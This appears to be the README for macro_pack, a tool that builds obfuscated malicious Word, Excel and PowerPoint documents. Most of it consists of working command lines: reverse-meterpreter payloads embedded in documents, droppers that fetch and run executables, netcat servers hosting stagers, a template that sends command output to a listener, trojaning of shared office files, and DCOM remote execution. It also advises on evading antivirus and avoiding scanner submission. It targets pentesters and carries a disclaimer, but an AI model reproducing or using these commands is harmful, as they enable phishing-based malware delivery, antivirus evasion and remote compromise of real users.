![Supported Python versions](https://img.shields.io/badge/python-3-brightgreen.svg)

# macro\_pack

## Short description

The macro\_pack is a tool used to automatize obfuscation and generation of MS Office documents for pentest, demo,  and social engineering assessments.
The goal of macro\_pack is to simplify antimalware solutions bypass and automatize the process from vba generation to final Office document generation.  
It is very simple to use:
* No configuration
* Everything can be done using a single line of code
* Generation of Word, Excel, and PowerPoint documents
* Advanced VBA macro attacks as well as DDE attacks

The tool is compatible with payloads generated by popular pentest tools (Metasploit, Empire, ...).
It is also easy to combine with other tools as it is possible to read input from stdin and have a quiet output to another tool.
This tool is written in Python3 and works on both Linux and Windows platform.

**Note:** Windows platform with genuine MS Office installed is required for Office documents automatic generation or trojan features.

<p align="center"><img src="./assets/1-2release.png" alt="Demo 1"></p>

### Obfuscation

The tool will use various obfuscation techniques, all automatic.
Basic obfuscation (-o option) includes:
* Renaming functions
* Renaming variables
* Removing spaces
* Removing comments
* Encoding Strings

Note that the main goal of macro\_pack obfuscation is not to prevent reverse engineering, it is to prevent antivirus detection.


### Generation

Macro Pack can generate several kinds of MS office documents and txt formats.
The format will be automatically guessed depending on the given file extension.
File generation is done using the option --generate or -G.  
Supported formats are:
* MS Word 97 (.doc)
* MS Word (.docm, .docx)
* MS Excel 97 (.xls)
* MS Excel (.xlsm)
* MS PowerPoint (.pptm)
* VBA text file (.vba)
* HTA text file (.hta)


### Ethical use

The macro\_pack tool shall only be used by pentester, security researchers, or other people with learning purpose. 
I condamn all use of security tools for unethical actions (weather these ar legal or illegal).
I know this will not prevent usage by malicious people and that is why all features are not publicly released.

### About pro mode...
You may notice that not all part of macro\_pack is available. Only the community version is available online.
I fear the features in the pro version are really too much "weaponizing" the process and I do not want it available to all script kiddies out there.
The pro mode includes features such as:
* Advance antimalware bypass
* VBOM security bypass
* Self decoding VBA
* MS Office persistance
* Trojan existing MS Office documents
* Anti-debug using http://seclists.org/fulldisclosure/2017/Mar/90

For now I do not plan to release or sell this pro version however if you are really interrested I can send pro binary in the next case:
* You resolve one or more opened issue (bug or enhancement) + I need to know your real identity



## Run/Install

### Run Windows binary
1) Get the latest binary from https://github.com/sevagas/macro_pack/releases/
2) Download binary on PC with genuine Microsoft Office installed.
3) Open console, CD to binary dir and call the binary, simple as that!
```bash
macro_pack.exe --help
```

### Install from sources
Download and install dependencies:
```bash
git clone https://github.com/sevagas/macro_pack.git
cd macro_pack
pip3 install -r requirements.txt
```

**Note:** For windows, you also need to download manually pywin32 from https://sourceforge.net/projects/pywin32/files/pywin32/

The tool is in python 3 so just start with with your python3 install. ex:
```bash
python3 macro_pack.py  --help
# or
python macro_pack.py --help # if python3 is default install
```
If you want to produce a standalone exe using pyinstaller, double-click on the "build.bat" script on a Windows machine.
The resulted macro\_pack.exe will be inside the **bin** directory.


## Some examples

### macro\_pack community

- Obfuscate the vba file generated by msfvenom and put result in a new vba file.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba
```

- Obfuscate Empire stager vba file and generate a MS Word document: 
```bash
macro_pack.exe -f empire.vba -o -G myDoc.docm
```

- Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe)
```bash
echo "https://myurl.url/payload.exe" "dropped.exe" |  macro_pack.exe -o -t DROPPER -G "drop.xlsm" 
```

- Create a word 97 document containing an obfuscated VBA reverse meterpreter payload inside a share folder: 
```bash
msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G \\REMOTE-PC\Share\meter.doc   
```

- Download and execute Empire Launcher stager without powershell.exe by using DROPPER_PS template
```bash
# 1 Generate a fiez containing Empire lauchcher 
# 2 Make that file available on web server, ex with netcat:
{ echo -ne "HTTP/1.0 200 OK\r\n\r\n"; cat empire_stager.cmd; } | nc -l -p 6666 -q1
# 3 Use macro\_pack  to generate DROPPER_PS payload in Excel file
echo http://10.5.5.12:6543/empire_stager.cmd | macro_pack.exe -o -t DROPPER_PS -G join_the_empire.xls
# 4 When executed on target, the macro will download PowerShdll, run it with rundll32, and download and execute stager.
```

- Execute calc.exe via Dynamic Data Exchange (DDE) attack
```bash
echo calc.exe | macro_pack.exe --dde -G dde_test.docx
```

- Download and execute file via powershell using Dynamic Data Exchange (DDE) attack
```bash
# 1 Change the target file URL in resources\community\ps_dl_exec.cmd
# 2 Embed download execute cmd in document
python macro_pack.py --dde -f ..\resources\community\ps_dl_exec.cmd -G DDE.doc
```


- Generated obfuscated HTA file which executes "systeminfo" and returns result to another macro_pack listening on 192.168.0.5
```batch
# 1 Generate HTA file with CMD template
echo http://192.168.0.5:1234/a "systeminfo" | macro_pack.exe -t CMD -o -G info.hta
# 2 On 192.168.0.5 open macro_pack as http listener
macro_pack.exe -l 1234
# 3 run hta file with mshta
mshta.exe full/path/to/info.hta
```

### macro\_pack pro

- Trojan the existing shared "report.xlsm" file with a dropper. Use anti-AV and anti-debug features.
```bash
echo "http://10.5.5.12/drop.exe" "dropped.exe" | macro_pack.exe -o -t DROPPER2 --trojan --av-bypass --stealth  -G "E:\accounting\report.xls"   
```

- Genenerate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV). Keep-alive is needed because we need meterpreter to stay alive before we migrate.
```bash
msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --vbom-encode --keep-alive  -G  out.docm
```

- Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass most antiviruses. 
```bash
msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --av-bypass --trojan -G  hotpics.pptm
```

- Execute a macro on a remote PC using DCOM
```batch
REM Step 1: Ensure you have enough rights
net use  \\192.168.0.8\c$ /user:domain\username password

REM Step 2: Generate document, for example here, meterpreter reverse TCP Excel file
echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G meter.xlsm
REM Step 3: Copy the document  somewhere on remote share
copy meter.xlsm "\\192.168.0.8\c$\users\username\meter.xlsm"
REM Step 4: Execute!
macro_pack.exe --dcom="\\192.168.0.8\c$\users\username\meter.xlsm"

REM Step 2 to 4 in one step:
echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\users\username\meter.xlsm" --dcom="\\192.168.0.8\c$\users\username\meter.xlsm"

```



## All available options

### General options:
```
    -f, --input-file=INPUT_FILE_PATH A VBA macro file or file containing params for --template option 
        If no input file is provided, input must be passed via stdin (using a pipe).
        
    -q, --quiet Do not display anything on screen, just process request. 
    
    -o, --obfuscate  Same as '--obfuscate-form --obfuscate-names --obfuscate-strings'
    --obfuscate-form Modify readability by removing all spaces and comments in VBA
    --obfuscate-strings Randomly split strings and encode them
    --obfuscate-names   Change functions, variables, and constants names
      
    -s, --start-function=START_FUNCTION   Entry point of macro file 
        Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
        
    -t, --template=TEMPLATE_NAME    Use VBA template already included in macro_pack.exe.
        Available templates are: HELLO, CMD, DROPPER, DROPPER2, DROPPER_PS, DROPPER_DLL, METERPRETER, EMBED_EXE 
        Help for template usage: macro_pack.exe -t help
         
         
    -G, --generated=OUTPUT_FILE_PATH. Generates a file containing the macro. Will guess the format based on extension.
        Supported extensions are: vba, doc, docm, xls, xlsm, pptm.
        Note: Apart from vba which is a text files, all other requires Windows OS with genuine MS Office installed.
    
    --dde  Dynamic Data Exchange attack mode. Input will be inserted as a cmd command and executed via DDE
         DDE attack mode is not compatible with VBA Macro related options.
         Usage: echo calc.exe | macro_pack.exe --dde -W DDE.docx
         Note: This option requires Windows OS with genuine MS Office installed.
         
    --run=FILE_PATH Open document using COM to run macro. Can be useful to bypass whitelisting situations.
       This will trigger AutoOpen/Workbook_Open automatically. 
       If no auto start function, use --start-function option to indicate which macro to run. 
    
    -l, --listen=PORT Open an HTTP server listening on defined port.
       
    -h, --help   Displays help and exit
    
  Notes:
    If no output file is provided, the result will be displayed on stdout.
    Combine this with -q option to pipe only processed result into another program
    ex: macro_pack.exe -f my_vba.vba -o -q | another_app
    Another valid usage is:
    cat input_file.vba | macro_pack.exe -o -q  > output_file.vba
```

### macro\_pack Pro only:
```   
    --vbom-encode   Use VBA self encoding to bypass antimalware detection and enable VBOM access (will exploit VBOM self activation vuln).
                  --start-function option may be needed.
    --av-bypass  Use various tricks  efficient to bypass most av (combine with -o for best result)
    --keep-alive    Use with --vbom-encode option. Ensure new app instance will stay alive even when macro has finished
    --persist       Use with --vbom-encode option. Macro will automatically be persisted in application startup path
                    (works with Excel documents only). The macro will then be executed anytime an Excel document is opened (even non-macro documents).
    -T, --trojan=OUTPUT_FILE_PATH   Inject macro in an existing MS office file. 
                    Supported files are the same as for the -G option.
                    Files will also be converted to approriate format, ex: pres.pptx will become pres.pptm
                    If file does not exist, it will be created (like -G option)
    --stealth      Anti-debug and hiding features
    --dcom=REMOTE_FILE_PATH Open remote document using DCOM for pivot/remote exec if psexec not possible for example.
                   This will trigger AutoOpen/Workboo_Open automatically. 
                   If no auto start function, use --start-function option to indicate which macro to run.
```


## Template usage
  
Templates can be called using  -t, --template=TEMPLATE_NAME combined with other options.  
Here are all the available templates.

            
### HELLO  
Just print a hello message and awareness about macro  
Give this template the name or email of the author   
  -> Example: ```echo "@Author" | macro_pack.exe -t HELLO -G hello.pptm```

  
### CMD
Execute a command line and send result to remote http server  
Give this template the server url and the command to run  
  -> Example:  ```echo "http://192.168.0.5:7777" "dir /Q C:" | macro_pack.exe -t CMD -o -G cmd.doc``` 
   
```bash
# Catch result with any webserver or netcat
nc -l -p 7777
```
            
### DROPPER
Download and execute a file.  
Give this template the file url and the target file path  
  -> Example:  ```echo <file_to_drop_url> "<download_path>" | macro_pack.exe -t DROPPER -o -G dropper.xls```
  
        
### DROPPER2
Download and execute a file. File attributes are also set to system, read-only, and hidden.  
Give this template the file url and the target file path.  
  -> Example:  ```echo <file_to_drop_url> "<download_path>" | macro_pack.exe -t DROPPER2 -o -G dropper.xlsm```
   
        
### DROPPER_PS
Download and execute Powershell script using rundll32 (to bypass blocked powershell.exe).  
Note: This payload will download PowerShdll from Github.  
Give this template the url of the powershell script you want to run  
  -> Example:  ```echo "<powershell_script_url>" | macro_pack.exe -t DROPPER_PS -o -G powpow.doc```
 
 
### DROPPER_DLL
Download a DLL with another extension and run it using Office VBA  
  -> Example, load meterpreter DLL using Office:  
```batch
REM Generate meterpreter dll payload
msfvenom.bat  -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f dll -o meter.dll
REM Make it available on webserver, ex using netcat on port 6666
{ echo -ne "HTTP/1.0 200 OK\r\n\r\n"; cat meter.dll; } | nc -l -p 6666 -q1
REM Create OFfice file which will download DLL and call it
REM The DLL URL is http://192.168.0.5:6666/normal.html and it will be saved as .asd file
echo "http://192.168.0.5:6666/normal.html" Run | macro_pack.exe -t DROPPER_DLL -o -G meterdll.xls
```
        
### METERPRETER  
Meterpreter reverse TCP template using MacroMeter by Cn33liz.  
This template is CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw.  
Give this template the IP and PORT of listening mfsconsole  
  -> Example: ```echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.docm``` 
 
Recommended msfconsole options (use exploit/multi/handler):
```
set PAYLOAD windows/meterpreter/reverse_tcp
set AutoRunScript post/windows/manage/smart_migrate
set EXITFUNC thread
set ExitOnSession false
set EnableUnicodeEncoding true
set EnableStageEncoding true
```

Warning: This is a 32 bit meterpreter so it will crash Office if Office 64bit is installed!


### EMBED_EXE
Will encode an executable inside the vba. When macro is played, exe will be decoded and executed (hidden) on file system.
This template is inspired by https://github.com/khr0x40sh/MacroShop
Give this template the path to exe you want to embed in vba and, optionaly, the path where exe should be extracted
If extraction path is not given, exe will be extracted with random name in current path.  
  -> Example1: ```echo "path\\to\my_exe.exe" | macro_pack.exe  -t EMBED_EXE -o -G my_exe.xlsm```  
  -> Example2: ```echo "path\\to\my_exe.exe" "D:\\another\path\your_exe.exe" | macro_pack.exe  -t EMBED_EXE -o -G my_exe.xlsm```  


## Efficiency

The various features were tested against localy installed Antimalware solutions as well as online service. I ran multiple tests with several kind of payloads and macro\_pack features.
A majority of antivirus will be evaded by the simple "obfuscate" option. Features available in pro mode generally ensure full AV bypass.

### Example with Empire VBA stager:

Here are the results of NoDistribute scanner for the regular Empire VBA stager
<p align="center"><img src="./assets/empireVbaAgent.png" alt="Empire VBA stager scan"></p>

Here are the results with the macro\_pack -o (--obfuscate) option
<p align="center"><img src="./assets/empireVBA_mp_obfuscate.png" alt="Empire VBA stager scan"></p>

**Warning:** Do not submit your samples to online scanner (ex VirusTotal), Its the best way to break your stealth macro.
I also suggest you do not submit to non reporting site such as NoDistribute. You cannot be sure what these sites will do with the data you submit. 
If you have an issue with macro\_pack AV detection you can write to us for advice or submit an issue or pull request.


## Relevant resources

Blog posts about MS Office security:
 - http://blog.sevagas.com/?My-VBA-Bot (write a full VBA RAT, includes how to bypass VBOM protection)
 - http://pwndizzle.blogspot.fr/2017/03/office-document-macros-ole-actions-dde.html
 - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/ (About Dynamic Data Exchange attacks)
 - https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/
 - https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/
 
 Other useful links:
 - https://github.com/p3nt4/PowerShdll (Run PowerShell with dlls only)
 - https://gist.github.com/vivami/03780dd512fec22f3a2bae49f9023384 (Run powershel script with PowerShdll VBA implementation)
 - https://enigma0x3.net/2016/03/15/phishing-with-empire/ (Generate Empire VBA payload)
 - https://github.com/EmpireProject/Empire
 - https://medium.com/@vivami/phishing-between-the-app-whitelists-1b7dcdab4279
 - https://www.metasploit.com/
 - https://github.com/Cn33liz/MacroMeter
 - https://github.com/khr0x40sh/MacroShop
 

## Contact

Feel free to message me on my Twitter account [@EmericNasi](http://twitter.com/EmericNasi)  
Emails:
* emeric.nasi[ at ]sevagas.com  
* ena.sevagas[ at ]protonmail.com  


## License and credits

[The Apache License 2.0](https://www.apache.org/licenses/LICENSE-2.0.html)

Copyright 2017 Emeric “Sio” Nasi ([blog.sevagas.com](http://blog.sevagas.com))


